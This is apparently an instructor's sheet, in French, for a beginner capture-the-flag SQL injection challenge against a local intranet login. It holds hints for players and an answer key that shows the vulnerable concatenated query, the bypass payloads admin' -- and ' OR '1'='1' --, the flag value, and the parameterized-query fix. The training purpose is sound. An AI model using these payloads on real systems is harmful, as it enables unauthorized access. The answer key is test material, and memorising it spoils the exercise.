# Challenge 1 - Intranet (Injection SQL)

**Catégorie :** Web — Injection SQL
**Difficulté :** Facile
**Lien :** http://localhost:5001 (ou l'adresse fournie par le formateur)

## Consigne (visible par les joueurs)

Un petit intranet d'entreprise protège par un formulaire de connexion un
message confidentiel réservé à l'administrateur. Vous n'avez pas de
compte valide, mais le formulaire de connexion a été codé un peu vite...

Parvenez à vous connecter en tant qu'administrateur pour récupérer le
message confidentiel. Le flag est au format `FLAG{...}`.

**Indice 1 (coût léger) :** Que se passe-t-il si le champ "identifiant"
contient une simple quote `'` ?

**Indice 2 (coût plus élevé) :** Les requêtes SQL peuvent être commentées
avec `--`. Si vous arrivez à commenter la fin de la requête, la
vérification du mot de passe pourrait disparaître.

## Corrigé formateur (ne pas publier aux joueurs)

Le formulaire construit la requête par concaténation :

```python
query = "SELECT username, role FROM users WHERE username = '{}' AND password = '{}'".format(username, password)
```

En envoyant comme identifiant :

```
admin' --
```

la requête exécutée devient :

```sql
SELECT username, role FROM users WHERE username = 'admin' --' AND password = '...'
```

Tout ce qui suit `--` est ignoré : la vérification du mot de passe est
neutralisée et la connexion réussit directement en tant qu'`admin`, ce
qui révèle le flag `FLAG{sQl1_1nj3ct10n_byp4ss_l0g1n}`.

Une tentative plus générique comme `' OR '1'='1' --` fonctionne aussi,
mais renverra la première ligne de la table (ici `bob`) plutôt que
`admin` spécifiquement : il faut guider les joueurs à cibler le compte
admin explicitement, ou accepter une solution par union/order by comme
variante valide.

**Correction à recommander (pour la partie "correction des failles") :**
utiliser des requêtes paramétrées :

```python
cur = db.execute("SELECT username, role FROM users WHERE username = ? AND password = ?", (username, password))
```
